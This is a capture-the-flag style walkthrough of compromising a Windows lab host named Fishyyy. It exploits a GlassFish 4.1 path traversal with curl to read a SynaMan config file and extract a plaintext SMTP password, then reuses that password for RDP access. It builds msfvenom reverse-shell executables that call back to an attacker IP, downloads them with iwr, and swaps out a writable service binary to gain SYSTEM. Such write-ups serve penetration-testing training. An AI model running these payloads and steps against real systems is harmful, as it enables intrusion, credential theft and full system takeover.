# NMAP

The command performs a comprehensive, stealthy port scan of all TCP ports on the target host. It disables host discovery, enables version detection, default script scanning, and attempts to identify the underlying operating system, reporting only ports found in the open state.

```bash
 sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.151.168   --open 

```

The Nmap scan results reveal a Windows host with multiple critical services exposed. Key findings include open SMB ports, a remote desktop service, a GlassFish application server on three web ports with potentially risky HTTP methods, a SynaMan file management web server, and several Java services including Java RMI and a message service. The SSL certificate on the terminal service is expired, and the host appears to be configured with multiple default or development services, significantly expanding the attack surface.

```bash
PORT      STATE SERVICE              VERSION
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
|_ssl-date: 2021-10-29T11:56:44+00:00; -4y62d04h20m59s from scanner time.
| ssl-cert: Subject: commonName=Fishyyy
| Not valid before: 2021-10-28T11:48:50
|_Not valid after:  2022-04-29T11:48:50
3700/tcp  open  giop
| fingerprint-strings: 
|   GetRequest, X11Probe: 
|     GIOP
|   giop: 
|     GIOP
|     (IDL:omg.org/SendingContext/CodeBase:1.0
|     169.254.240.58
|     169.254.240.58
|_    default
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-title: Login
|_http-server-header: GlassFish Server Open Source Edition  4.1 
5040/tcp  open  unknown
6060/tcp  open  x11?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"425-1267803922000"
|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
|     Content-Type: text/html
|     Content-Length: 425
|     Date: Fri, 29 Oct 2021 11:53:46 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <html>
|     <head>
|     <META HTTP-EQUIV="REFRESH" CONTENT="1;URL=app">
|     </head>
|     <body>
|     <script type="text/javascript">
|     <!--
|     currentLocation = window.location.pathname;
|     if(currentLocation.charAt(currentLocation.length - 1) == "/"){
|     window.location = window.location + "app";
|     }else{
|     window.location = window.location + "/app";
|     //-->
|     </script>
|     Loading Administration console. Please wait...
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: JSESSIONID=F4D252ADE9DDCA2C4DAC70358D0337E9; Path=/
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 5028
|     Date: Fri, 29 Oct 2021 11:53:48 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
|     <title>
|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
|     </title>
|     <meta NAME="Description" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta NAME="Keywords" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta http-equiv="X-UA-Compatible" content="IE=10" />
|     <link rel="icon" type="image/png" href="images/favicon.png">
|     <link type="text/css" rel="stylesheet" href="images/AjaxFileExplorer.css">
|     <link rel="stylesheet" type="text/css"
|   JavaRMI: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 145
|     Date: Fri, 29 Oct 2021 11:53:41 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|_    <html><head><title>Oops</title><body><h1>Oops</h1><p>Well, that didn't go as we had expected.</p><p>This error has been logged.</p></body></html>
7676/tcp  open  java-message-service Java Message Service 301
7680/tcp  open  pando-pub?
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: GlassFish Server Open Source Edition  4.1 
|_http-title: Data Web
8181/tcp  open  ssl/http             Sun GlassFish Open Source Edition  4.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-title: Data Web
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2014-08-21T13:30:10
|_Not valid after:  2024-08-18T13:30:10
|_http-server-header: GlassFish Server Open Source Edition  4.1 
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @169.254.240.58:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC


```

The provided file appears to be a screenshot of a login page for a GlassFish Server administration console. It indicates that "Secure Admin must be enabled to access the DAS remotely," suggesting the remote administration interface is currently locked due to a security configuration, which may prevent direct login attempts through this web interface.

![[Pasted image 20251230161949.png]]

The provided file is a screenshot of a login page for SynaMan version 5.1, a file management application by Synametrics Technologies. This indicates the presence of a web-based file management interface that requires authentication.

![[Pasted image 20251230162013.png]]

The Searchsploit query for Oracle GlassFish 4.1 identified multiple public exploits, specifically path traversal vulnerabilities, indicating this version of the application server is vulnerable to arbitrary file read attacks. Metasploit modules are available for both Linux and Windows platforms.

```bash
searchsploit  Oracle GlassFish 4.1 
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Oracle Glassfish OSE 4.1 - Path Traversal (Metasploit)                                                                                                     | linux/webapps/45198.rb
Oracle GlassFish Server 4.1 - Directory Traversal                                                                                                          | multiple/webapps/39441.txt
Oracle GlassFish Server Open Source Edition 4.1 - Path Traversal (Metasploit)                                                                              | windows/webapps/45196.rb
Oracle GlassFish Server Open Source Edition 4.1 - Path Traversal (Metasploit)                                                                              | windows/webapps/45196.rb
--------------------------------------------

```

The exploit for a directory traversal vulnerability in Oracle GlassFish Server 4.1 has been downloaded locally. The vulnerability, identified as CVE-2017-1000028, allows an unauthenticated attacker to read arbitrary files from the server's filesystem by manipulating the URL path.

```bash
searchsploit -m   multiple/webapps/39441.txt

  Exploit: Oracle GlassFish Server 4.1 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/39441
     Path: /usr/share/exploitdb/exploits/multiple/webapps/39441.txt
    Codes: CVE-2017-1000028
 Verified: True
File Type: Unicode text, UTF-8 text
Copied to: /home/kali/Downloads/fish/39441.txt

```

The curl command successfully exploited a path traversal vulnerability in the GlassFish server. By using Unicode-encoded directory traversal sequences in the URL, the attacker was able to read the Windows system file `win.ini` from the host, confirming arbitrary file read access and the existence of the CVE-2017-1000028 vulnerability.

```bash
curl http://192.168.151.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

The command exploited the path traversal vulnerability to read the `AppConfig.xml` configuration file for the SynaMan application. This file likely contains sensitive configuration details, such as database connection strings, application paths, or potentially even credentials for the SynaMan file management service.

```bash
curl http://192.168.151.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../SynaMan/config/AppConfig.xml
```

The retrieved AppConfig.xml file contains the plaintext SMTP password "KingOfAtlantis" for the user "arthur" on the server "[mail.fish.pg](https://mail.fish.pg/)". This credential is a critical finding. The configuration also indicates that CSRF prevention is disabled.

```bash
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
        <parameters>
                <parameter name="adminEmail" type="1" value="admin@fish.pg"></parameter>
                <parameter name="smtpSecurity" type="1" value="None"></parameter>
                <parameter name="jvmPath" type="1" value="jre/bin/java"></parameter>
                <parameter name="userHomeRoot" type="1" value="C:\ProgramData\SynaManHome"></parameter>
                <parameter name="httpPortSSL" type="2" value="-1"></parameter>
                <parameter name="httpPort" type="2" value="0"></parameter>
                <parameter name="vmParams" type="1" value="-Xmx128m -DLoggingConfigFile=logconfig.xml"></parameter>
                <parameter name="synametricsUrl" type="1" value="http://synametrics.com/SynametricsWebApp/"></parameter>
                <parameter name="lastSelectedTab" type="1" value="1"></parameter>
                <parameter name="emailServerWebServicePort" type="2" value=""></parameter>
                <parameter name="imagePath" type="1" value="images/"></parameter>
                <parameter name="defaultOperation" type="1" value="frontPage"></parameter>
                <parameter name="publicIPForUrl" type="1" value=""></parameter>
                <parameter name="flags" type="2" value="2"></parameter>
                <parameter name="httpPort2" type="2" value="6060"></parameter>
                <parameter name="useUPnP" type="4" value="true"></parameter>
                <parameter name="smtpServer" type="1" value="mail.fish.pg"></parameter>
                <parameter name="smtpUser" type="1" value="arthur"></parameter>
                <parameter name="InitialSetupComplete" type="4" value="true"></parameter>
                <parameter name="disableCsrfPrevention" type="4" value="true"></parameter>
                <parameter name="failureOverHttpPort" type="2" value="55222"></parameter>
                <parameter name="smtpPort" type="2" value="25"></parameter>
                <parameter name="httpIP" type="1" value=""></parameter>
                <parameter name="emailServerWebServiceHost" type="1" value=""></parameter>
                <parameter name="smtpPassword" type="1" value="KingOfAtlantis"></parameter>
                <parameter name="ntServiceCommand" type="1" value="net start SynaMan"></parameter>
                <parameter name="mimicHtmlFiles" type="4" value="false"></parameter>
        </parameters>
</Configuration>                                           

```

The NetExec command successfully authenticated to the Remote Desktop Protocol service on the target using the credentials Arthur:KingOfAtlantis. The "Pwn3d!" status indicates a successful login and full administrative access to the host, effectively compromising the system.

```bash
 netexec rdp 192.168.151.168 -u Arthur -p KingOfAtlantis
RDP         192.168.151.168 3389   FISHYYY          [*] Windows 10 or Windows Server 2016 Build 19041 (name:FISHYYY) (domain:Fishyyy) (nla:False)
RDP         192.168.151.168 3389   FISHYYY          [+] Fishyyy\Arthur:KingOfAtlantis (Pwn3d!)
```

The xfreerdp command was used to initiate a Remote Desktop Protocol session to the target host with the compromised credentials. This action establishes a graphical, interactive connection to the Windows desktop, providing full control over the compromised host as the authenticated user.

```bash
xfreerdp /u:arthur /p:KingOfAtlantis /v:192.168.151.168 
```

The msfvenom command generated a Windows x64 reverse TCP shell payload. This executable file, when executed on the target host, will create a network connection back to the attacker's machine at IP 192.168.45.207 on port 443 to provide remote command execution.

```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.207 LPORT=443 -f exe -o pwned.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: pwned.exe
```

The screenshot shows the attacker's command execution on the compromised host. The attacker used PowerShell to download the malicious `pwned.exe` reverse shell from the attacking machine and subsequently executed it, triggering the payload to establish a reverse shell connection.

![[Pasted image 20251230164401.png]]

The attacker has read the contents of the `local.txt` proof file located on the user's desktop. The retrieved hash `b908b20b6eea5b7b71b49be0d44c257f` serves as evidence of successful local user compromise and access to the filesystem.

```bash
C:\Users\arthur\Desktop>type local.txt
type local.txt
b908b20b6eea5b7b71b49be0d44c257f


```

The icacls command output shows the access control list for the GlassFish binary directory. The "Authenticated Users" group has Modify (M) and Modify Child (OI)(CI)(IO) permissions, indicating that the current user, Arthur, has the ability to write and replace executable files within this directory. This finding reveals a potential privilege escalation path.

```bash
C:\Users\arthur>icacls C:\glassfish4\glassfish\domains\domain1\bin
icacls C:\glassfish4\glassfish\domains\domain1\bin
C:\glassfish4\glassfish\domains\domain1\bin BUILTIN\Administrators:(I)(OI)(CI)(F)
                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                            BUILTIN\Users:(I)(OI)(CI)(RX)
                                            NT AUTHORITY\Authenticated Users:(I)(M)
                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files


```

The `whoami /priv` command output displays the privileges of the current user session. The user possesses the standard user privileges, with only `SeChangeNotifyPrivilege` enabled. Notably, there are no high-value privileges like `SeDebugPrivilege` or `SeImpersonatePrivilege` immediately available for direct privilege escalation.

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled


```

The directory listing of the GlassFish bin directory shows the executable file `domain1Service.exe`, which is the Windows service wrapper for the GlassFish application server. The user's write permissions to this directory, as previously identified, allow for the replacement or modification of this service binary to achieve persistence or privilege escalation.

```bash
Directory of C:\glassfish4\glassfish\domains\domain1\bin

10/28/2021  04:48 AM    <DIR>          .
10/28/2021  04:48 AM    <DIR>          ..
03/24/2025  04:48 AM                 0 domain1Service.err.log
10/28/2021  04:15 AM            30,208 domain1Service.exe
03/24/2025  04:48 AM                 0 domain1Service.out.log
03/24/2025  04:48 AM             1,692 domain1Service.wrapper.log
10/28/2021  04:15 AM             3,121 domain1Service.xml
               5 File(s)         35,021 bytes
               2 Dir(s)   2,290,970,624 bytes free

```

A second malicious payload was generated using msfvenom, crafted as a replacement for the legitimate `domain1Service.exe` file. This executable is a reverse shell that will connect back to the attacker on port 4848, intended to be executed with SYSTEM privileges when the GlassFish service is restarted or upon system reboot.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.207 LPORT=4848 -f exe -o domain1Service.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: domain1Service.exe


```

The legitimate `domain1Service.exe` service binary was renamed to `domain1Service.exe.bak` as a backup. This action prepares the directory for the placement of the malicious replacement executable while preserving the original file for potential restoration.

```bash
move domain1Service.exe domain1Service.exe.bak
```

The attacker downloaded the malicious `domain1Service.exe` payload from the attacking machine and saved it over the legitimate service binary in the GlassFish directory. The directory listing confirms the replacement, showing the new 7168-byte malicious file alongside the backup of the original 30208-byte legitimate executable.

```bash
S C:\glassfish4\glassfish\domains\domain1\bin> iwr -uri 192.168.45.207/domain1Service.exe -outfile domain1Service.exe
iwr -uri 192.168.45.207/domain1Service.exe -outfile domain1Service.exe
PS C:\glassfish4\glassfish\domains\domain1\bin> dir
dir


    Directory: C:\glassfish4\glassfish\domains\domain1\bin


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         3/24/2025   4:48 AM              0 domain1Service.err.log                                               
-a----        10/29/2021   5:34 AM           7168 domain1Service.exe                                                   
-a----        10/28/2021   4:15 AM          30208 domain1Service.exe.bak                                               
-a----         3/24/2025   4:48 AM              0 domain1Service.out.log                                               
-a----         3/24/2025   4:48 AM           1692 domain1Service.wrapper.log                                           
-a----        10/28/2021   4:15 AM           3121 domain1Service.xml     

```

The `shutdown /r /t 0` command was executed to force an immediate reboot of the compromised host. This action was taken to trigger the execution of the malicious `domain1Service.exe` file, which is configured to run as a Windows service with SYSTEM privileges upon system startup.

```bash
PS C:\glassfish4\glassfish\domains\domain1\bin> shutdown /r /t 0

```

A reverse shell connection was received on the attacker's listener from the target host. The session has SYSTEM-level privileges, as indicated by the `C:\Users\Administrator\Desktop>` prompt. The attacker successfully read the `proof.txt` file on the Administrator's desktop, obtaining the final proof hash `ed8a6117d32a5d32f37f947caca2fdea`, which confirms full system compromise and privilege escalation to the highest level.

```bash
rlwrap -cAr nc -lnvp 4848
listening on [any] 4848 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.151.168] 49669
Microsoft Windows [Version 10.0.19042.1288]
(c) Microsoft Corporation. All rights reserved.
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
ed8a6117d32a5d32f37f947caca2fdea
```